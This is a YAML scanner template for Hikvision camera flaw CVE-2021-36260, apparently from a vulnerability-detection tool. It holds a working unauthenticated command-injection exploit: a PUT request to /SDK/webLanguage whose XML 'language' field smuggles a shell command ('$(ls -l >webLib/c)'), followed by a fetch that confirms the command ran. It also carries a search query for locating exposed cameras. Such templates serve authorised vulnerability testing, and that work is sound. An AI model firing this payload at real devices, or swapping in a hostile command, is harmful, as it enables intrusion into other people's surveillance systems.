name: Hikvision Unauthenticated RCE CVE-2021-36260
manual: true
query: app="Hikvision-Cameras-and-Surveillance"
transport: http
rules:
  r0:
    request:
      method: GET
      path: /
    expression: response.status == 200
  r1:
    request:
      method: PUT
      path: /SDK/webLanguage
      headers:
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
      body: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<language>$(ls -l >webLib/c)</language>"
    expression: response.status == 500
  r2:
    request:
      method: GET
      path: /c
    expression: response.status == 200
expression: r0() && r1() && r2()
detail:
  links:
  - https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html
  - https://www.hikvision.com/en/support/cybersecurity/security-advisory/security-notification-command-injection-vulnerability-in-some-hikvision-products/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-36260
  - https://github.com/Aiminsun/CVE-2021-36260
  description: Hikvision is a world leading IoT solution provider with video as its
    core competency.
  tags: rce
